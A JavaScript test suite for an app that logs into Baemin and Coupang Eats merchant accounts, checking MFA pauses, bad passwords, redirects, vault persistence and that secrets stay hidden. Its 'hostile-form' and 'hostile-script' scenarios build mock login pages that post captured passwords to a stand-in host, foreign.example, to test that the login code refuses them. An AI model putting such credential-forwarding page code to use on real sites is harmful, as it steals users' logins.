import test from 'node:test';
import assert from 'node:assert/strict';
import { chromium } from 'playwright-core';
import { mkdtemp, readFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { once } from 'node:events';
import { deliveryLoginConfig, loginDeliveryWithCredentials, DeliveryAccountConnector } from '../src/delivery-login.js';
import { AuthVault } from '../src/auth-vault.js';
import { createApp } from '../src/server.js';
import { deliveryPlatforms } from '../public/platforms.js';
import { cleanupTestDirectory } from './cleanup.js';

test('delivery official forms submit once and pause for challenges, wrong passwords, redirects and unexpected destinations', async t => {
  const browser = await chromium.launch({ channel: 'chrome', headless: true }); t.after(() => browser.close());
  for (const provider of ['baemin', 'coupangeats']) for (const scenario of ['success', 'mfa', 'pre-mfa', 'password-change', 'invalid', 'hostile-form', 'hostile-script', 'redirect', 'duplicate']) await t.test(`${provider}: ${scenario}`, async () => {
    const config = deliveryLoginConfig[provider], credentials = { method: provider, username: 'synthetic-account', password: 'synthetic-password-only!' };
    const context = await browser.newContext({ serviceWorkers: 'block' }); let submissions = 0, captured;
    await context.exposeBinding('captureFields', (_, username, password) => { captured = { username, password }; });
    await context.route('**/*', async route => {
      const req = route.request(), url = new URL(req.url());
      if (req.method() !== 'GET' || ![config.origin, new URL(config.home).origin].includes(url.origin)) return route.abort();
      if (url.origin === new URL(config.home).origin && url.pathname === new URL(config.home).pathname) return route.fulfill({ contentType: 'text/html; charset=utf-8', body: provider === 'baemin' ? '<select><option value="123">매장</option></select>' : '<h1>매장 관리</h1>' });
      const action = scenario === 'hostile-form' ? 'https://foreign.example/receive' : provider === 'baemin' ? '/login' : '/';
      const fields = provider === 'baemin' ? '<input name="id"><input name="password" type="password">' : '<input id="loginId"><input id="password" type="password">';
      const payload = provider === 'baemin' ? '{id:user,pw:"random-padding",value1:"encrypted-user",value2:"encrypted-password",token:"",autoLogin:false}' : '{loginId:user,password:pass}';
      const target = scenario === 'hostile-script' ? 'https://foreign.example/receive' : config.origin + config.endpoint;
      const outcome = scenario === 'mfa' ? 'document.body.innerHTML="<p>인증번호를 입력하세요</p><input autocomplete=one-time-code>"' : scenario === 'invalid' ? 'document.body.innerHTML="<p>아이디 또는 비밀번호가 일치하지 않습니다.</p>"' : `location.href=${JSON.stringify(config.home)}`;
      const body = `<form action="${action}">${fields}<button type="submit" disabled>로그인</button></form><script>
        const inputs=document.querySelectorAll('input'),button=document.querySelector('button'); for(const input of inputs)input.oninput=()=>button.disabled=![...inputs].every(i=>i.value);
        document.querySelector('form').onsubmit=async e=>{e.preventDefault();const user=inputs[0].value,pass=inputs[1].value;await window.captureFields(user,pass);try{const send=()=>fetch(${JSON.stringify(target)},{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(${payload})});await (await send()).json();${scenario === 'duplicate' ? 'await send();' : ''}${outcome}}catch{}};
      </script>`;
      await route.fulfill({ contentType: 'text/html; charset=utf-8', body: scenario === 'pre-mfa' ? '<p>보안 문자를 입력하세요</p><input name=captcha>' : scenario === 'password-change' ? '<p>비밀번호 변경이 필요합니다</p><input type=password><input type=password>' : body });
    });
    try {
      const page = await context.newPage(); await page.goto(config.loginUrl);
      // Substitute the guard's network response too: no synthetic credential reaches a live site.
      const actualRoute = page.route.bind(page), actualUnroute = page.unroute.bind(page), wrappers = new Map();
      page.route = async (pattern, handler) => {
        const wrapped = route => handler({ request: () => route.request(), continue: () => route.fallback(), abort: () => route.abort(),
          fetch: async options => { assert.equal(options.maxRedirects, 0); submissions++; return { status: () => scenario === 'redirect' ? 307 : 200, json: async () => scenario === 'invalid' ? { message: '아이디 또는 비밀번호가 일치하지 않습니다.' } : {}, dispose: async () => {} }; },
          fulfill: ({ response }) => route.fulfill({ status: response.status(), contentType: 'application/json', body: '{}' }),
        }); wrappers.set(handler, wrapped); return actualRoute(pattern, wrapped);
      };
      page.unroute = (pattern, handler) => actualUnroute(pattern, wrappers.get(handler));
      const connector = { provider, getPage: async () => page, status: async () => ({ connected: page.url() === config.home }) };
      if (scenario === 'hostile-form') await assert.rejects(loginDeliveryWithCredentials(connector, credentials, { timeout: 3000 }), error => error.code === 'LOGIN_LAYOUT');
      else {
        const result = await loginDeliveryWithCredentials(connector, credentials, { timeout: 3000 });
        if (scenario === 'success') assert.equal(result.connected, true);
        else assert.equal(result.reason, ['mfa', 'pre-mfa', 'password-change'].includes(scenario) ? 'verification' : scenario === 'invalid' ? 'invalid_credentials' : 'connection_error');
      }
      assert.equal(submissions, ['pre-mfa', 'password-change', 'hostile-form', 'hostile-script'].includes(scenario) ? 0 : 1);
      if (submissions) assert.deepEqual(captured, { username: credentials.username, password: credentials.password });
      if (await page.locator(config.password).count()) assert.equal(await page.locator(config.password).inputValue(), '');
    } finally { await context.close(); }
  });
});

test('delivery account status detects expired sessions and preserves an existing challenge after restart', async t => {
  const browser = await chromium.launch({ channel: 'chrome', headless: true }); t.after(() => browser.close());
  for (const provider of ['baemin', 'coupangeats']) {
    const config = deliveryLoginConfig[provider], context = await browser.newContext(); let connected = true, outage = false, restored = 0;
    await context.route('**/*', async route => {
      const url = new URL(route.request().url());
      if (url.pathname.startsWith('/api/')) return route.fulfill({ status: outage ? 503 : connected ? 200 : 401, contentType: 'application/json', body: JSON.stringify({ code: 'SUCCESS', data: { data: [] } }) });
      if (url.origin === new URL(config.home).origin && url.pathname === new URL(config.home).pathname) {
        if (!connected) return route.fulfill({ contentType: 'text/html', body: `<script>location.href=${JSON.stringify(config.loginUrl)}</script>` });
        return route.fulfill({ contentType: 'text/html', body: provider === 'baemin' ? '<select><option value="123">가게</option></select>' : '<h1>매장 관리</h1>' });
      }
      return route.fulfill({ contentType: 'text/html; charset=utf-8', body: '<p>추가 인증이 필요합니다</p><input autocomplete=one-time-code>' });
    });
    const host = { connect: async () => ({ contexts: () => [context] }) }, account = new DeliveryAccountConnector(host, provider, () => { restored++; });
    assert.equal((await account.status()).connected, true); assert.equal(restored, 1);
    connected = false; assert.equal((await account.status(true)).connected, false);
    if (provider === 'coupangeats') { outage = true; assert.equal((await account.status(true)).networkError, true); outage = false; await account.page.goto(config.loginUrl); }
    const restarted = new DeliveryAccountConnector(host, provider); assert.equal((await restarted.getPage()).url(), config.loginUrl);
    assert.equal((await restarted.status()).connected, false); assert.equal(await restarted.page.locator('input[autocomplete=one-time-code]').count(), 1, `${provider}: ${await restarted.page.locator('body').innerText()}`);
    await context.close();
  }
});

test('delivery credentials share one recovery per provider, persist password updates, pause for MFA and remain secret', async t => {
  const directory = await mkdtemp(path.join(os.tmpdir(), 'review-http-test-')), port = 14327, base = `http://127.0.0.1:${port}`;
  const calls = { baemin: [], coupangeats: [] }, connected = { baemin: false, coupangeats: false };
  const protect = async (value, decrypt) => decrypt ? value.slice(7) : `cipher:${value}`;
  const deliveryVaults = Object.fromEntries(Object.keys(calls).map(provider => [provider, new AuthVault(directory, protect, { platform: provider })]));
  const deliveryAccountConnectors = Object.fromEntries(Object.keys(calls).map(provider => [provider, { status: async () => ({ connected: connected[provider] }), login: async credentials => { calls[provider].push(credentials); return { connected: false, reason: 'verification' }; }, open: async () => ({ connected: connected[provider] }) }]));
  const offline = { status: async () => ({ connected: false }) }, deliveryConnectors = Object.fromEntries(Object.keys(deliveryPlatforms).map(p => [p, offline]));
  const app = await createApp({ directory, port, connector: offline, coupangConnector: offline, ablyConnector: offline, deliveryConnectors, deliveryAccountConnectors, deliveryVaults, maintenanceInterval: 0 });
  const { server, csrf, deliveryAuth, sources, store } = app; server.listen(port, '127.0.0.1'); await once(server, 'listening');
  t.after(async () => { server.closeAllConnections(); await new Promise(resolve => server.close(resolve)); await Promise.allSettled(Object.values(deliveryAuth).map(a => a.pending)); await cleanupTestDirectory(directory); });
  const post = (provider, action, data, token = csrf) => fetch(`${base}/api/auth/${provider}/${action}`, { method: 'POST', headers: { Origin: base, 'X-Review-Token': token, 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
  for (const provider of Object.keys(calls)) {
    assert.equal(sources[`${provider}-teawest`].autoLogin, sources[`${provider}-besti`].autoLogin);
    assert.equal((await post(provider, 'settings', { enabled: true }, 'bad')).status, 403);
    assert.equal((await post(provider, 'settings', { enabled: true, password: 'missing-account' })).status, 400);
    assert.equal((await post(provider, 'settings', { enabled: true, method: provider, username: `${provider}-test-account`, password: 'synthetic-old-password' })).status, 200); await deliveryAuth[provider].pending;
    await Promise.all([sources[`${provider}-teawest`].autoLogin.schedule(), sources[`${provider}-besti`].autoLogin.schedule()]); assert.equal(calls[provider].length, 1);
    assert.equal(deliveryAuth[provider].publicState().phase, 'needs_verification');
    const reloaded = new AuthVault(directory, protect, { platform: provider }); await reloaded.init(); assert.equal(reloaded.publicState().blocked, 'verification');
    assert.equal((await post(provider, 'settings', { enabled: true, method: provider, username: '', password: 'synthetic-new-password' })).status, 200); await deliveryAuth[provider].pending;
    assert.equal(calls[provider].length, 2); assert.equal(calls[provider][1].username, `${provider}-test-account`); assert.equal(calls[provider][1].password, 'synthetic-new-password');
    connected[provider] = true; await deliveryAuth[provider].schedule(); assert.equal(deliveryAuth[provider].publicState().blocked, null); assert.equal(calls[provider].length, 2);
    for (const route of ['/api/session', '/api/status', '/api/reviews']) { const text = await fetch(base + route).then(r => r.text()); assert.equal(text.includes('test-account'), false); assert.equal(text.includes('synthetic-new-password'), false); }
    assert.equal((await fetch(`${base}/.local/${provider}-auth.json`)).status, 404);
    assert.equal(JSON.stringify(store.data).includes('synthetic-new-password'), false); assert.equal((await readFile(deliveryVaults[provider].file, 'utf8')).includes('synthetic-new-password'), false);
    assert.equal((await post(provider, 'forget', {}).then(r => r.json())).configured, false);
  }
});
